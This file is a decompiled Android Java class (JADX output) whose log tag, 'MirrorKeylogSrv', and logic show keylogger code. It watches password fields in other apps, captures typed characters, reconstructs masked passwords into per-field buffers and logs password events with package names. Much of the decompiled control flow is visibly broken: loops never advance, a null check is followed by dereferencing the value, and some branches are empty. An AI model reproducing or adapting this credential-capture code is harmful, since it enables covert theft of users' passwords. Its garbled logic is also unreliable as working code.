// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.os.Handler;
import android.util.Log;
import java.util.HashMap;
import java.util.HashSet;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class a5 implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f3463c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ j5 f3464d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ i5 f3465e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final /* synthetic */ y.e f3466f;

    public /* synthetic */ a5(j5 j5Var, i5 i5Var, y.e eVar, int i3) {
        this.f3463c = i3;
        this.f3464d = j5Var;
        this.f3465e = i5Var;
        this.f3466f = eVar;
    }

    /* JADX WARN: Code duplicated, block: B:174:0x034f  */
    /* JADX WARN: Code duplicated, block: B:177:0x0358  */
    /* JADX WARN: Code duplicated, block: B:178:0x0362  */
    /* JADX WARN: Code duplicated, block: B:184:0x0378  */
    /* JADX WARN: Code duplicated, block: B:189:0x038e  */
    /* JADX WARN: Code duplicated, block: B:191:0x0394  */
    /* JADX WARN: Code duplicated, block: B:192:0x0399  */
    /* JADX WARN: Code duplicated, block: B:195:0x03a5  */
    /* JADX WARN: Code duplicated, block: B:196:0x03aa  */
    /* JADX WARN: Code duplicated, block: B:197:0x03ac  */
    /* JADX WARN: Code duplicated, block: B:201:0x03b2  */
    /* JADX WARN: Code duplicated, block: B:203:0x03b6  */
    /* JADX WARN: Code duplicated, block: B:204:0x03c0  */
    /* JADX WARN: Code duplicated, block: B:208:0x03c8  */
    /* JADX WARN: Code duplicated, block: B:215:0x03e3  */
    /* JADX WARN: Code duplicated, block: B:217:0x03e9  */
    /* JADX WARN: Code duplicated, block: B:220:0x03f0  */
    /* JADX WARN: Code duplicated, block: B:222:0x03fa  */
    /* JADX WARN: Code duplicated, block: B:225:0x0401 A[ADDED_TO_REGION] */
    /* JADX WARN: Code duplicated, block: B:231:0x0415  */
    /* JADX WARN: Code duplicated, block: B:233:0x041f  */
    /* JADX WARN: Code duplicated, block: B:237:0x0435  */
    /* JADX WARN: Code duplicated, block: B:239:0x043b  */
    /* JADX WARN: Code duplicated, block: B:240:0x0440  */
    /* JADX WARN: Code duplicated, block: B:243:0x0447  */
    /* JADX WARN: Code duplicated, block: B:244:0x044c  */
    /* JADX WARN: Code duplicated, block: B:246:0x044f  */
    /* JADX WARN: Code duplicated, block: B:254:0x046b  */
    /* JADX WARN: Code duplicated, block: B:279:0x03fc A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:282:0x0423 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:285:0x0459 A[ADDED_TO_REGION, REMOVE, SYNTHETIC] */
    @Override // java.lang.Runnable
    public final void run() {
        Handler handler;
        j3 j3Var;
        int i3;
        int i4;
        HashMap map;
        String str;
        int i5;
        int i6;
        int length;
        char[] cArr;
        char[] cArr2;
        char c3;
        int i7;
        int iMax;
        int i8;
        char cCharAt;
        char cCharAt2;
        int i9;
        String strSubstring;
        int i10;
        char cCharAt3;
        char cCharAt4;
        String strI;
        String str2;
        String str3;
        switch (this.f3463c) {
            case 0:
                j5 j5Var = this.f3464d;
                i5 i5Var = this.f3465e;
                y.e eVar = this.f3466f;
                j5Var.getClass();
                eVar.n(new a5(j5Var, i5Var, eVar, 3));
                break;
            case 1:
                j5 j5Var2 = this.f3464d;
                i5 i5Var2 = this.f3465e;
                y.e eVar2 = this.f3466f;
                j5Var2.getClass();
                eVar2.n(new a5(j5Var2, i5Var2, eVar2, 2));
                break;
            case 2:
                j5 j5Var3 = this.f3464d;
                i5 i5Var3 = this.f3465e;
                y.e eVar3 = this.f3466f;
                j5Var3.getClass();
                String strM = j5.m(i5Var3.f4241a, i5Var3.f4249i, i5Var3.f4246f, i5Var3.f4242b, i5Var3.f4250j, i5Var3.f4248h);
                j5Var3.x(strM, eVar3);
                String strE = j5Var3.E(i5Var3);
                boolean z2 = i5Var3.f4253m || ((str2 = j5Var3.f4329x) != null && str2.equals(strM));
                if (z2 && j5Var3.G.contains(strM) && j5.v(strE)) {
                    int length2 = strE.length();
                    if (length2 == j5Var3.C) {
                        j5Var3.f4309c.c(System.currentTimeMillis(), strM, i5Var3.f4241a);
                        d2.y yVar = j5Var3.f4309c;
                        System.currentTimeMillis();
                        yVar.f(length2);
                    } else {
                        j5Var3.G.remove(strM);
                        if (strM.equals(j5Var3.F)) {
                            j5Var3.F = null;
                        }
                        j5Var3.f4324s = System.currentTimeMillis();
                        d2.y yVar2 = j5Var3.f4309c;
                        System.currentTimeMillis();
                        yVar2.f(length2);
                    }
                }
                f5 f5VarA = (f5) j5Var3.f4307a.get(strM);
                if (f5VarA == null) {
                    f5VarA = j5.A(i5Var3, j5Var3.f4326u);
                    j5Var3.f4307a.put(strM, f5VarA);
                }
                if (z2) {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    j5Var3.f4309c.c(jCurrentTimeMillis, strM, i5Var3.f4241a);
                    int length3 = (j5.v(strE) || j5.f(strE)) ? strE.length() : -1;
                    int length4 = j5.v(i5Var3.f4245e) ? i5Var3.f4245e.length() : -1;
                    Log.d("MirrorKeylogSrv", "[SoftKb] pw-event pkg=" + i5Var3.f4241a + " inputLen=" + i5Var3.f4243c.length() + " resolvedLen=" + strE.length() + " newLen=" + length3 + " maskLen=" + j5Var3.C + " resolvedMask=" + j5.v(strE) + " containsMask=" + j5.f(strE));
                    j5Var3.f4327v = i5Var3.f4241a;
                    j5Var3.f4328w = i5Var3.f4242b;
                    j5Var3.f4329x = strM;
                    String str4 = i5Var3.f4246f;
                    if (str4 == null) {
                        str4 = "";
                    }
                    j5Var3.f4331z = str4;
                    String str5 = i5Var3.f4247g;
                    if (str5 == null) {
                        str5 = "";
                    }
                    j5Var3.A = str5;
                    String str6 = i5Var3.f4250j;
                    if (str6 == null) {
                        str6 = "";
                    }
                    j5Var3.B = str6;
                    String str7 = j5Var3.f4326u;
                    if (str7 != null) {
                        j5Var3.f4330y = str7;
                    }
                    boolean z3 = (i5Var3.f4253m || strE.isEmpty() || j5.f(strE)) ? false : true;
                    if (z3) {
                        j5Var3.f4308b.put(strM, strE.toCharArray());
                        j5Var3.f4309c.h(strE, jCurrentTimeMillis);
                        j5Var3.G.add(strM);
                    } else {
                        HashSet hashSet = j5Var3.G;
                        if (length3 == 0) {
                            hashSet.remove(strM);
                            j5Var3.F = null;
                            j5Var3.C = 0;
                        } else if (hashSet.contains(strM) && length3 >= 0 && length4 >= 0 && length3 != length4) {
                            j5Var3.G.remove(strM);
                            if (strM.equals(j5Var3.F)) {
                                j5Var3.F = null;
                            }
                        }
                    }
                    if (!z3 && length3 >= 0) {
                        j5Var3.C = Math.max(j5Var3.C, length3);
                    }
                    if (!z3 && (length3 > 0 || length4 > 0)) {
                        j5Var3.f4324s = jCurrentTimeMillis;
                    }
                    if (!z3 && j5.G(strE)) {
                        j5Var3.z(strE);
                    }
                    if (!z3 && j5Var3.G.contains(strM) && j5.v(strE)) {
                        j5Var3.f4309c.f(strE.length());
                    } else {
                        j3 j3Var2 = j5Var3.f4321p;
                        if (j3Var2 != null) {
                            i3 = length3;
                            i4 = length4;
                            if (j3Var2.f4305b != j5Var3.f4322q) {
                                j3Var = j3Var2;
                                String str8 = jCurrentTimeMillis - j3Var.f4306c <= 1500 ? j3Var.f4304a : "";
                                if (i3 >= 0 || i4 < 0) {
                                    j5Var3.f4323r = false;
                                } else {
                                    boolean z4 = true;
                                    if (i3 - i4 == 1) {
                                        if (str8.length() == 1) {
                                            if (Character.isISOControl(str8.charAt(0))) {
                                                z4 = true;
                                            } else {
                                                j5Var3.f4309c.e(str8.charAt(0), jCurrentTimeMillis);
                                                j5Var3.f4322q = j3Var.f4305b;
                                                j5Var3.f4323r = false;
                                            }
                                        }
                                        j5Var3.f4323r = z4;
                                        j5Var3.f4324s = jCurrentTimeMillis;
                                    } else {
                                        j5Var3.f4323r = false;
                                    }
                                }
                                if (j5.v(strE)) {
                                    j5Var3.f4309c.f(strE.length());
                                } else if (j5.v(i5Var3.f4245e) && strE.isEmpty()) {
                                    j5Var3.f4309c.f(0);
                                }
                                if (!z3) {
                                    map = j5Var3.f4308b;
                                    str = i5Var3.f4245e;
                                    i5 = i5Var3.f4252l;
                                    i6 = i5Var3.f4251k;
                                    if (strE.isEmpty() || !str.isEmpty()) {
                                        if (strE.isEmpty()) {
                                            length = str.length();
                                        } else {
                                            length = strE.length();
                                        }
                                        cArr = (char[]) map.get(strM);
                                        if (length == 0) {
                                            map.remove(strM);
                                        } else {
                                            if (cArr == null && cArr.length == length) {
                                                c3 = 0;
                                            } else {
                                                cArr2 = new char[length];
                                                if (cArr != null) {
                                                    c3 = 0;
                                                    System.arraycopy(cArr, 0, cArr2, 0, Math.min(cArr.length, length));
                                                } else {
                                                    c3 = 0;
                                                }
                                                cArr = cArr2;
                                            }
                                            if (!strE.isEmpty() || j5.f(strE)) {
                                                if (!strE.isEmpty()) {
                                                    for (i7 = c3; i7 < strE.length(); i7++) {
                                                        cCharAt4 = strE.charAt(i7);
                                                        if (!j5.w(cCharAt4)) {
                                                            cArr[i7] = cCharAt4;
                                                        }
                                                    }
                                                    if (i6 > 0 && i5 >= 0 && (i9 = i6 + i5) <= strE.length()) {
                                                        strSubstring = strE.substring(i5, i9);
                                                        for (i10 = c3; i10 < strSubstring.length(); i10++) {
                                                            cCharAt3 = strSubstring.charAt(i10);
                                                            if (!j5.w(cCharAt3)) {
                                                                cArr[i5 + i10] = cCharAt3;
                                                            }
                                                        }
                                                    }
                                                    iMax = Math.max(str.length(), strE.length());
                                                    for (i8 = c3; i8 < iMax; i8++) {
                                                        if (i8 < strE.length()) {
                                                            cCharAt = strE.charAt(i8);
                                                        } else {
                                                            cCharAt = c3;
                                                        }
                                                        if (i8 < str.length()) {
                                                            cCharAt2 = str.charAt(i8);
                                                        } else {
                                                            cCharAt2 = c3;
                                                        }
                                                        if (cCharAt == 0 && !j5.w(cCharAt) && cCharAt != cCharAt2) {
                                                            cArr[i8] = cCharAt;
                                                        }
                                                    }
                                                }
                                                map.put(strM, cArr);
                                            } else {
                                                for (int i11 = c3; i11 < strE.length(); i11++) {
                                                    cArr[i11] = strE.charAt(i11);
                                                }
                                                map.put(strM, cArr);
                                            }
                                        }
                                    }
                                    strE = j5Var3.C(strM, strE);
                                    strI = j5Var3.f4309c.i();
                                    if (strI != null) {
                                        strE = strI;
                                    }
                                }
                            } else {
                                j3Var = j3Var2;
                            }
                        } else {
                            j3Var = j3Var2;
                            i3 = length3;
                            i4 = length4;
                        }
                        if (i3 >= 0) {
                            j5Var3.f4323r = false;
                        } else {
                            j5Var3.f4323r = false;
                        }
                        if (j5.v(strE)) {
                            j5Var3.f4309c.f(strE.length());
                        } else if (j5.v(i5Var3.f4245e)) {
                            j5Var3.f4309c.f(0);
                        }
                        if (!z3) {
                            map = j5Var3.f4308b;
                            str = i5Var3.f4245e;
                            i5 = i5Var3.f4252l;
                            i6 = i5Var3.f4251k;
                            if (strE.isEmpty()) {
                                if (strE.isEmpty()) {
                                    length = str.length();
                                } else {
                                    length = strE.length();
                                }
                                cArr = (char[]) map.get(strM);
                                if (length == 0) {
                                    map.remove(strM);
                                } else {
                                    if (cArr == null) {
                                        cArr2 = new char[length];
                                        if (cArr != null) {
                                            c3 = 0;
                                            System.arraycopy(cArr, 0, cArr2, 0, Math.min(cArr.length, length));
                                        } else {
                                            c3 = 0;
                                        }
                                        cArr = cArr2;
                                    } else {
                                        cArr2 = new char[length];
                                        if (cArr != null) {
                                            c3 = 0;
                                            System.arraycopy(cArr, 0, cArr2, 0, Math.min(cArr.length, length));
                                        } else {
                                            c3 = 0;
                                        }
                                        cArr = cArr2;
                                    }
                                    if (strE.isEmpty()) {
                                        if (!strE.isEmpty()) {
                                            while (i7 < strE.length()) {
                                                cCharAt4 = strE.charAt(i7);
                                                if (!j5.w(cCharAt4)) {
                                                    cArr[i7] = cCharAt4;
                                                }
                                            }
                                            if (i6 > 0) {
                                                strSubstring = strE.substring(i5, i9);
                                                while (i10 < strSubstring.length()) {
                                                    cCharAt3 = strSubstring.charAt(i10);
                                                    if (!j5.w(cCharAt3)) {
                                                        cArr[i5 + i10] = cCharAt3;
                                                    }
                                                }
                                            }
                                            iMax = Math.max(str.length(), strE.length());
                                            while (i8 < iMax) {
                                                if (i8 < strE.length()) {
                                                    cCharAt = strE.charAt(i8);
                                                } else {
                                                    cCharAt = c3;
                                                }
                                                if (i8 < str.length()) {
                                                    cCharAt2 = str.charAt(i8);
                                                } else {
                                                    cCharAt2 = c3;
                                                }
                                                if (cCharAt == 0) {
                                                }
                                            }
                                        }
                                        map.put(strM, cArr);
                                    } else {
                                        if (!strE.isEmpty()) {
                                            while (i7 < strE.length()) {
                                                cCharAt4 = strE.charAt(i7);
                                                if (!j5.w(cCharAt4)) {
                                                    cArr[i7] = cCharAt4;
                                                }
                                            }
                                            if (i6 > 0) {
                                                strSubstring = strE.substring(i5, i9);
                                                while (i10 < strSubstring.length()) {
                                                    cCharAt3 = strSubstring.charAt(i10);
                                                    if (!j5.w(cCharAt3)) {
                                                        cArr[i5 + i10] = cCharAt3;
                                                    }
                                                }
                                            }
                                            iMax = Math.max(str.length(), strE.length());
                                            while (i8 < iMax) {
                                                if (i8 < strE.length()) {
                                                    cCharAt = strE.charAt(i8);
                                                } else {
                                                    cCharAt = c3;
                                                }
                                                if (i8 < str.length()) {
                                                    cCharAt2 = str.charAt(i8);
                                                } else {
                                                    cCharAt2 = c3;
                                                }
                                                if (cCharAt == 0) {
                                                }
                                            }
                                        }
                                        map.put(strM, cArr);
                                    }
                                }
                            } else {
                                if (strE.isEmpty()) {
                                    length = str.length();
                                } else {
                                    length = strE.length();
                                }
                                cArr = (char[]) map.get(strM);
                                if (length == 0) {
                                    map.remove(strM);
                                } else {
                                    if (cArr == null) {
                                        cArr2 = new char[length];
                                        if (cArr != null) {
                                            c3 = 0;
                                            System.arraycopy(cArr, 0, cArr2, 0, Math.min(cArr.length, length));
                                        } else {
                                            c3 = 0;
                                        }
                                        cArr = cArr2;
                                    } else {
                                        cArr2 = new char[length];
                                        if (cArr != null) {
                                            c3 = 0;
                                            System.arraycopy(cArr, 0, cArr2, 0, Math.min(cArr.length, length));
                                        } else {
                                            c3 = 0;
                                        }
                                        cArr = cArr2;
                                    }
                                    if (strE.isEmpty()) {
                                        if (!strE.isEmpty()) {
                                            while (i7 < strE.length()) {
                                                cCharAt4 = strE.charAt(i7);
                                                if (!j5.w(cCharAt4)) {
                                                    cArr[i7] = cCharAt4;
                                                }
                                            }
                                            if (i6 > 0) {
                                                strSubstring = strE.substring(i5, i9);
                                                while (i10 < strSubstring.length()) {
                                                    cCharAt3 = strSubstring.charAt(i10);
                                                    if (!j5.w(cCharAt3)) {
                                                        cArr[i5 + i10] = cCharAt3;
                                                    }
                                                }
                                            }
                                            iMax = Math.max(str.length(), strE.length());
                                            while (i8 < iMax) {
                                                if (i8 < strE.length()) {
                                                    cCharAt = strE.charAt(i8);
                                                } else {
                                                    cCharAt = c3;
                                                }
                                                if (i8 < str.length()) {
                                                    cCharAt2 = str.charAt(i8);
                                                } else {
                                                    cCharAt2 = c3;
                                                }
                                                if (cCharAt == 0) {
                                                }
                                            }
                                        }
                                        map.put(strM, cArr);
                                    } else {
                                        if (!strE.isEmpty()) {
                                            while (i7 < strE.length()) {
                                                cCharAt4 = strE.charAt(i7);
                                                if (!j5.w(cCharAt4)) {
                                                    cArr[i7] = cCharAt4;
                                                }
                                            }
                                            if (i6 > 0) {
                                                strSubstring = strE.substring(i5, i9);
                                                while (i10 < strSubstring.length()) {
                                                    cCharAt3 = strSubstring.charAt(i10);
                                                    if (!j5.w(cCharAt3)) {
                                                        cArr[i5 + i10] = cCharAt3;
                                                    }
                                                }
                                            }
                                            iMax = Math.max(str.length(), strE.length());
                                            while (i8 < iMax) {
                                                if (i8 < strE.length()) {
                                                    cCharAt = strE.charAt(i8);
                                                } else {
                                                    cCharAt = c3;
                                                }
                                                if (i8 < str.length()) {
                                                    cCharAt2 = str.charAt(i8);
                                                } else {
                                                    cCharAt2 = c3;
                                                }
                                                if (cCharAt == 0) {
                                                }
                                            }
                                        }
                                        map.put(strM, cArr);
                                    }
                                }
                            }
                            strE = j5Var3.C(strM, strE);
                            strI = j5Var3.f4309c.i();
                            if (strI != null) {
                                strE = strI;
                            }
                        }
                    }
                }
                f5VarA.f3997f = z2;
                f5VarA.f3998g = strE;
                String str9 = i5Var3.f4243c;
                f5VarA.f3999h = str9;
                f5VarA.f4000i = strE.equals(str9) ? "" : strE;
                f5VarA.f4001j = i5Var3.f4245e;
                e2.q0 q0Var = f5VarA.f4002k;
                if (q0Var != null && (handler = j5Var3.f4318l.f3874b) != null) {
                    handler.removeCallbacks(q0Var);
                }
                e2.q0 q0Var2 = new e2.q0(j5Var3, strM, eVar3, 4);
                f5VarA.f4002k = q0Var2;
                long j3 = z2 ? 180L : 400L;
                Handler handler2 = j5Var3.f4318l.f3874b;
                if (handler2 != null) {
                    handler2.postDelayed(q0Var2, j3);
                }
                break;
            default:
                j5 j5Var4 = this.f3464d;
                i5 i5Var4 = this.f3465e;
                y.e eVar4 = this.f3466f;
                d2.y yVar3 = j5Var4.f4309c;
                String str10 = i5Var4.f4241a;
                int i12 = i5Var4.f4249i;
                String str11 = i5Var4.f4246f;
                String str12 = i5Var4.f4242b;
                String strM2 = j5.m(str10, i12, str11, str12, i5Var4.f4250j, i5Var4.f4248h);
                j5Var4.x(strM2, eVar4);
                HashMap map2 = j5Var4.f4307a;
                f5 f5VarA2 = (f5) map2.get(strM2);
                if (f5VarA2 == null) {
                    f5VarA2 = j5.A(i5Var4, j5Var4.f4326u);
                    map2.put(strM2, f5VarA2);
                }
                String strE2 = j5Var4.E(i5Var4);
                String str13 = f5VarA2.f3998g;
                if ((str13 == null || str13.isEmpty()) && !strE2.isEmpty()) {
                    f5VarA2.f3998g = strE2;
                    String str14 = i5Var4.f4243c;
                    f5VarA2.f3999h = str14;
                    f5VarA2.f4000i = strE2.equals(str14) ? "" : strE2;
                }
                if (i5Var4.f4253m) {
                    long jCurrentTimeMillis2 = System.currentTimeMillis();
                    String str15 = j5Var4.f4329x;
                    if (str15 != null && !str15.equals(strM2)) {
                        j5Var4.F = null;
                    }
                    j5Var4.f4327v = str10;
                    j5Var4.f4328w = str12;
                    j5Var4.f4329x = strM2;
                    String str16 = i5Var4.f4246f;
                    if (str16 == null) {
                        str16 = "";
                    }
                    j5Var4.f4331z = str16;
                    String str17 = i5Var4.f4247g;
                    if (str17 == null) {
                        str17 = "";
                    }
                    j5Var4.A = str17;
                    String str18 = i5Var4.f4250j;
                    j5Var4.B = str18 != null ? str18 : "";
                    String str19 = j5Var4.f4326u;
                    if (str19 != null) {
                        j5Var4.f4330y = str19;
                    }
                    yVar3.c(jCurrentTimeMillis2, strM2, str10);
                    if (!strE2.isEmpty() && !j5.f(strE2)) {
                        j5Var4.f4308b.put(strM2, strE2.toCharArray());
                    } else if (j5.v(strE2)) {
                        yVar3.f(strE2.length());
                        if (j5.G(strE2)) {
                            j5Var4.C = strE2.length();
                            j5Var4.f4324s = jCurrentTimeMillis2;
                            j5Var4.z(strE2);
                        }
                    } else if (j5.f(strE2)) {
                        j5Var4.C = strE2.length();
                        j5Var4.f4324s = jCurrentTimeMillis2;
                        j5Var4.z(strE2);
                    }
                    break;
                } else if (j5Var4.C >= 4 && j5Var4.f4324s > 0 && System.currentTimeMillis() - j5Var4.f4324s <= 15000 && (str3 = j5Var4.f4329x) != null && !j5Var4.G.contains(str3) && !strM2.equals(j5Var4.f4329x)) {
                    Log.d("MirrorKeylogSrv", "[SoftKb] field-blur reveal maskLen=" + j5Var4.C);
                    j5Var4.y();
                    break;
                }
                break;
        }
    }
}
